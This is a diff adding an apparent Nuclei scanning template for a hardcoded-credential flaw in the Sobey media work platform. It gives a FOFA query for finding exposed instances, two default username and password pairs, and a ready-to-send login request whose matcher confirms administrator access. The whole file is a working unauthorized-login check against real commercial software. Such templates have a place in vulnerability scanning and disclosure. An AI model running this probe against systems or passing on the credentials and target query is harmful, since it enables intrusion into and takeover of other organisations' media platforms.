@@ -1,0 +1,35 @@
+id: sobey-media-platform-hardcoded-password
+
+info:
+  name: "索贝融媒体工作平台 sobey 默认凭证漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
+      索贝融媒体工作平台 sobey 模块中存在硬编码凭证漏洞，攻击者可利用默认账户凭证（sobey/sobey）访问后台管理系统，导致系统权限被非法获取。
+      sobey/sobey
+      sobey/Sobeyhive-2016
+  tags: 索贝融媒体工作平台
+
+http:
+- raw:
+  - |
+    POST /user/login HTTP/1.1
+    Host: {{Hostname}}
+    Accept: application/json, text/plain, */*
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Content-Type: application/json;charset=utf-8
+    mam-product: mah
+    Connection: keep-alive
+    Cookie: apiVersion=mamcore2.1; lang=zh; site=S1
+
+    {"loginName":"sobey","password":"sobey","version":"V2"}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'isAdmin'
